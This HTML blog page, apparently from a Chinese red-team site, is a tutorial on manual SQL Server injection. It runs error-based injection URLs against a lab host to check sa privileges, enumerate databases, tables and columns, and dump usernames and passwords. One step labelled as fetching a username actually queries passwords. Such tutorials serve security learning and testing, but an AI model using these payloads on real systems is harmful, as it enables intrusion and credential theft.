@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>史上最详细的sqlServer手工注入详解 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">史上最详细的sqlServer手工注入详解</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 9, 2020&nbsp;&nbsp;19:06:26</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29418950&auto=1&height=66"></iframe>
+
+<h2 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h2><h3 id="数据库简介"><a href="#数据库简介" class="headerlink" title="数据库简介"></a>数据库简介</h3><p><code>MSSQL</code>是指微软的<code>SQL Server</code>数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属关系型数据库</p>
+<h3 id="注入简介"><a href="#注入简介" class="headerlink" title="注入简介"></a>注入简介</h3><p><code>MSSQL</code>注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路</p>
+<p>对于<code>mssql</code>的一个注入点我们往往最关心的这个注入点的权限问题,是<code>sa</code>、<code>db_owner</code>还是<code>public</code>;其次是这个注点是否显错,注释语句是否可用,例如<code>sql server</code>中注释符“<code>--</code>”;还有就是注入点是什么类型的,是字符型注入,还是数字型注入。</p>
+<p>对与<code>mssql</code>有三个权限，<code>sa</code>（最高权限，相当于system），<code>db</code>（文件管理，数据库操作等等，相当于user-administrator），<code>public</code>（数据库操作权限，相当于guest-users）</p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>基础知识：<code>MSSQL</code>的系统自带库–&gt;<code>master</code></p>
+<p>其实再每个网站中，一般一个网站不会跨库，而在<code>MSSQL</code>中每个库都有一个系统自带表–&gt;<code>sysobjects</code></p>
+<p>此系统表中对我们有用的只有3个字段，<code>NAME</code>字段和<code>XTYPE</code>字段和<code>ID</code>字段，<code>name就是表名信息</code>，<code>xtype是代表表的类型</code>，只有两个参数，<code>S</code>代表系统自带表，<code>U</code>代表用户创建的表，<code>id</code>字段的值用来<code>连接syscolumns</code>表</p>
+<p><code>syscolumns</code>表中我们需要查询的字段就是<code>name</code>字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1350.png" alt="图片"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2073058421</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1351.png" alt="图片"></p>
+<p><code>top</code>关键字：由于<code>MSSQL</code>中不存在<code>limit</code>，那么想要输出一条数据怎么办呢，直接<code>top 1</code>，输出两条数据<code>top 2</code>，输出第二条数据<code>top 1+</code>限制条件!</p>
+<p>如何实现<code>MySQL</code>中的<code>group_concat()</code>函数的用法，实例如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> top <span class="number">1</span> id, [name] <span class="operator">=</span> stuff((<span class="keyword">SELECT</span> <span class="string">&#x27;,&#x27;</span> <span class="operator">+</span> [name] <span class="keyword">FROM</span> syscolumns sys <span class="keyword">WHERE</span> sys.id <span class="operator">=</span> syscolumns.id <span class="keyword">FOR</span> xml path(<span class="string">&#x27;&#x27;</span>)) , <span class="number">1</span> , <span class="number">1</span> , <span class="string">&#x27;&#x27;</span>) <span class="keyword">FROM</span> syscolumns <span class="keyword">where</span> id <span class="operator">=</span><span class="number">2073058421</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1352.png" alt="图片"></p>
+<h3 id="Mssql插入新的数据"><a href="#Mssql插入新的数据" class="headerlink" title="Mssql插入新的数据"></a>Mssql插入新的数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (id,username,password,age) <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="number">20</span>)</span><br><span class="line">注释：</span><br><span class="line">	<span class="keyword">insert</span> <span class="keyword">into</span> users (id,username,password,age)：往users表里 id,username,password,age 插入数据</span><br><span class="line">     <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="number">20</span>)	：插入数据的值为：<span class="number">4</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;test,&#x27;</span><span class="number">20</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1353.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1354.png" alt="图片"></p>
+<h3 id="Mssql修改数据"><a href="#Mssql修改数据" class="headerlink" title="Mssql修改数据"></a>Mssql修改数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">update users <span class="keyword">set</span> username<span class="operator">=</span><span class="string">&#x27;saul123&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">4</span>;</span><br><span class="line">注释：</span><br><span class="line">	update users   更新更改 users 表</span><br><span class="line">    <span class="keyword">set</span> username<span class="operator">=</span><span class="string">&#x27;saul123&#x27;</span>	吧 username 的值修改为 saul123</span><br><span class="line">    <span class="keyword">where</span> id<span class="operator">=</span><span class="number">4</span>	条件是 id<span class="operator">=</span><span class="number">4</span> 这条数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1355.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1356.png" alt="图片"></p>
+<h3 id="Mssql删除数据"><a href="#Mssql删除数据" class="headerlink" title="Mssql删除数据"></a>Mssql删除数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">4</span>;</span><br><span class="line">注释：</span><br><span class="line">	<span class="keyword">delete</span> <span class="keyword">from</span> users 删除 users 表里的</span><br><span class="line">    <span class="keyword">where</span> id<span class="operator">=</span><span class="number">4</span>	条件是 id<span class="operator">=</span><span class="number">4</span> 这条数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1357.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1358.png" alt="图片"></p>
+<h3 id="MSSQL中常用参数"><a href="#MSSQL中常用参数" class="headerlink" title="MSSQL中常用参数"></a>MSSQL中常用参数</h3><p><code>@@version</code>，查询当前数据库版本<br><code>db_name()</code>，查询当前数据库名称<br><code>user</code>，查询当前用户<br><code>IS_SRVROLEMEMBER()</code>，查询数据库权限。<br>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin<br>用法如下，证明相应权限则返回<code>1</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1359.png" alt="图片"></p>
+<h2 id="Mssql手工注入详解"><a href="#Mssql手工注入详解" class="headerlink" title="Mssql手工注入详解"></a>Mssql手工注入详解</h2><p>注入点：<a target="_blank" rel="noopener" href="http://192.168.159.135:8080/get.aspx?id=1">http://192.168.159.135:8080/get.aspx?id=1</a></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1360.png" alt="图片"></p>
+<h3 id="判断是否是Mssql数据库"><a href="#判断是否是Mssql数据库" class="headerlink" title="判断是否是Mssql数据库"></a>判断是否是Mssql数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and (select count(*) from sysobjects)&gt;0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1361.png" alt="图片"></p>
+<p>页面返回正常说明是 <code>mssql</code> 数据库！而且你使用了上面这条语句说明它权限还有点大，还有可能是 <code>sa</code> 权限，因为可以读取任意表。</p>
+<h3 id="判断权限"><a href="#判断权限" class="headerlink" title="判断权限"></a>判断权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;serveradmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;setupadmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;securityadmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;diskadmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;bulkadmin&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> IS_MEMBER(<span class="string">&#x27;db_owner&#x27;</span>));<span class="operator">-</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1362.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;));--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1363.png" alt="图片"></p>
+<p>页面返回正常，说明他是 <code>sa</code> 权限！</p>
+<h3 id="查看当前数据库版本"><a href="#查看当前数据库版本" class="headerlink" title="查看当前数据库版本"></a>查看当前数据库版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select @@version)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1364.png" alt="图片"></p>
+<p>由上图可见，它的<code>Mssql</code>版本是：Microsoft SQL Server 2005 - 9.00.1399.06 (X64) .</p>
+<p>这里为什么要加一个 <code>and 1=(select @@version)</code> 呢？是这样的，<code>and 1</code> 是<code>int</code>类型，它用了 <code>=</code> 后面的<code>(select @@version)</code> 是<code>字符类</code>型，那肯定是<code>不等于</code>啊，那么就会<code>报错</code>从而爆出相关查询信息。</p>
+<p>这里为什么会报错呢？因为我们原本访问网站 <code>id=1</code> 查询的是数字类型<code>int</code>，而我们查询的是<code>字符类</code>型，所以他从字符类型<code>转换</code>为int类型<code>失败</code>就导致网站报错从而泄露网站的数据库版本信息！</p>
+<p>实际上我们可以直接吧 <code>@@version</code> 放到 <code>id=</code>后面它也会被查询出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=@@version</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1365.png" alt="图片"></p>
+<h3 id="查看当前数据库名称"><a href="#查看当前数据库名称" class="headerlink" title="查看当前数据库名称"></a>查看当前数据库名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select db_name())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1366.png" alt="图片"></p>
+<p>同理我们也可以使用这种方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=db_name()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1367.png" alt="图片"></p>
+<h3 id="获取第一个用户数据库的名称"><a href="#获取第一个用户数据库的名称" class="headerlink" title="获取第一个用户数据库的名称"></a>获取第一个用户数据库的名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1368.png" alt="图片"></p>
+<p>由上图可见，我们爆出来的用户创建的<code>第一个</code>数据库名为 <code>test</code> 。</p>
+<p><code>top 1</code> 是一个<code>SQL</code>查询的<code>子句</code>，它用于查询结果<code>只显示首条</code>记录。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">1</span> <span class="operator">*</span> <span class="keyword">FROM</span>的含义：</span><br><span class="line">　　<span class="number">1</span>、<span class="keyword">select</span>为命令动词，含义为执行数据查询操作；</span><br><span class="line">　　<span class="number">2</span>、top <span class="number">1</span>子句含义为查询结果只显示首条记录；</span><br><span class="line">　　<span class="number">3</span>、<span class="operator">*</span>子句表示查询结果包括数据源中的所有字段；</span><br><span class="line">　　<span class="number">4</span>、<span class="keyword">from</span>子句为指定数据源。</span><br></pre></td></tr></table></figure>
+
+<p>对于 <code>master..sysdatabases</code> 这个意思是这样的：在<code>mssql</code>系统默认数据库<code>master</code> 的<code>系统视图</code>里有这些：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1369.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1370.png" alt="图片"></p>
+<p>懂我意思吧？</p>
+<p>这里我来解释一下后面的 <code>dbid&gt;4</code> 是什么意思：<code>mssql</code>是靠<code>dbid</code>来区分数据库名的！前面<code>4</code>个<code>id号</code>是默认<code>mssql</code>数据库<code>自带</code>的：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1371.png" alt="图片"></p>
+<p>所以我们查询的时候需要从 <code>dbid</code>第<code>五</code>个开始查询，因为第<code>五</code>个就是用户所创建的<code>第一个数据库</code>，以此类推！</p>
+<h3 id="获取第二个用户数据库的名称"><a href="#获取第二个用户数据库的名称" class="headerlink" title="获取第二个用户数据库的名称"></a>获取第二个用户数据库的名称</h3><p>因为刚刚我们爆出来<code>第一个数据库</code>的名称是 <code>test</code>，那么我们就可以使用下面的语句来查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name !=&#x27;test&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1372.png" alt="图片"></p>
+<p>这里我来解释一下 ：<code>where dbid&gt;4 and name !=&#39;test&#39;</code> ，这条语句是说明条件是 <code>dbid&gt;4</code> 和 <code>name</code>名字<code>不等于</code>-<code>test</code>的数据库！这样一来我们查询到了第二个用户创建的数据库名为：<code>saulgoodman</code>！假如我们想要查询第三数据库名就可以按照这样的方式以此类推！</p>
+<h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p>使用这种个语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from master..sysdatabases where dbid&gt;5)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1373.png" alt="图片"></p>
+<p>我们只需要把 <code>dbid&gt;4</code> 修改为 <code>dbid&gt;5</code> 就可以查询第二个数据库了！以此类推！</p>
+<h3 id="小技巧-获取所有数据库的名字"><a href="#小技巧-获取所有数据库的名字" class="headerlink" title="(小技巧)获取所有数据库的名字"></a>(小技巧)获取所有数据库的名字</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select name from master..sysdatabases for xml path)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1374.png" alt="图片"></p>
+<p>关于 <code>for xml path</code>的意思就是将查询结果集以<code>XML</code>形式展现！</p>
+<p>具体可以参考这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34379433/article/details/93652001">https://blog.csdn.net/weixin_34379433/article/details/93652001</a></p>
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>获取当前网站数据库所使用的<code>第一个表名</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1375.png" alt="图片"></p>
+<p>由上图可知，我们获取到第一个表名是 <code>users</code>，如果想获取到<code>第二个表名</code>的话就可以这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name !=&#x27;users&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1376.png" alt="图片"></p>
+<p>这里我来说一下：<code>where xtype=&#39;u&#39; and name !=&#39;users&#39;</code> ，对于 <code>xtype</code> 我文章开头已经说过了，大家往前翻！后面的意思就是 <code>name</code> 不等于 <code>users</code> 表，那么就会查询下一个表名，这样我们就能获取到 <code>users</code> 表的下一个表名！想要获取到第三个表名就以此类推！</p>
+<h3 id="小技巧-爆出所有表名"><a href="#小技巧-爆出所有表名" class="headerlink" title="(小技巧)爆出所有表名"></a>(小技巧)爆出所有表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select name from sysobjects for xml path)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1377.png" alt="图片"></p>
+<p>和上面爆所有数据库名那个一样，简单粗暴！</p>
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p>我们知道了表名是 <code>users</code> ，那么就可以利用下面的语句来爆 <code>users</code> 下面的列名:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1378.png" alt="图片"></p>
+<p>获取下一个列名就可以这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;) and name !=&#x27;id&#x27;) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1379.png" alt="图片"></p>
+<p>依次类推我们爆出了下面这些列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;) and name !=&#x27;id&#x27; and name !=&#x27;username&#x27;  ) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1380.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;) and name !=&#x27;id&#x27; and name !=&#x27;username&#x27;  and name !=&#x27;password&#x27;) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1381.png" alt="图片"></p>
+<p>这个时候我们就获取到了网站的表名：<code>users</code>，网站的列名：<code>id</code>，<code>username</code>、<code>password</code>。</p>
+<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>获取账号 <code>username</code> 的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 username from users) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1382.png" alt="图片"></p>
+<p>想要获取<code>第二个</code>账号 <code>username</code> 的值那么就加一个条件语句 <code>where</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 password from users where id=2) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1383.png" alt="图片"></p>
+<p>依次类推爆出所有的用户名！</p>
+<p>获取密码 <code>password</code> 的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 password from users) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1384.png" alt="图片"></p>
+<p>想要获取<code>第二个</code>密码 <code>password</code> 的值那么就加一个条件语句 <code>where</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(select top 1 password from users where id=2) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1385.png" alt="图片"></p>
+<p>依次类推爆出所有的密码！</p>
